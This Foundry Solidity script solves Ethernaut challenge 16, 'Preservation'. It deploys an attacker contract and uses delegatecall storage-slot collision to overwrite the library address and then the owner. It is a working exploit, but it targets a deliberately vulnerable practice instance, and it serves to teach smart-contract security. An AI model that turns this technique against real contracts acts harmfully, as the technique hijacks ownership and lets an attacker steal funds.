// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/16-Preservation/PreservationAttacker.sol";

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function owner() external view returns (address);
    function timeZone1Library() external view returns (address);
}

/**
 * @title Challenge 16 Solution Script
 * @notice Exploit delegatecall to overwrite owner via storage layout manipulation
 */
contract PreservationSolution is Script {
    // Replace with your instance address from Ethernaut
    address constant INSTANCE = 0x3833F5b03D1471484d90F04177b68766ccC070B0;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(deployerPrivateKey);

        IPreservation target = IPreservation(INSTANCE);

        vm.startBroadcast(deployerPrivateKey);

        // Step 1: Deploy attacker contract that has matching storage layout
        PreservationAttacker attacker = new PreservationAttacker();

        // Step 2: Call setFirstTime with attacker address as uint256
        // This overwrites timeZone1Library (slot 0) via delegatecall
        target.setFirstTime(uint256(uint160(address(attacker))));
        console.log("timeZone1Library set to attacker:", target.timeZone1Library());

        // Step 3: Call setFirstTime again - now delegatecalls to attacker
        // Attacker's setTime() sets slot 2 (owner) to msg.sender
        target.setFirstTime(uint256(uint160(player)));
        console.log("Owner is now:", target.owner());

        vm.stopBroadcast();

        console.log("Challenge 16 completed!");
    }
}
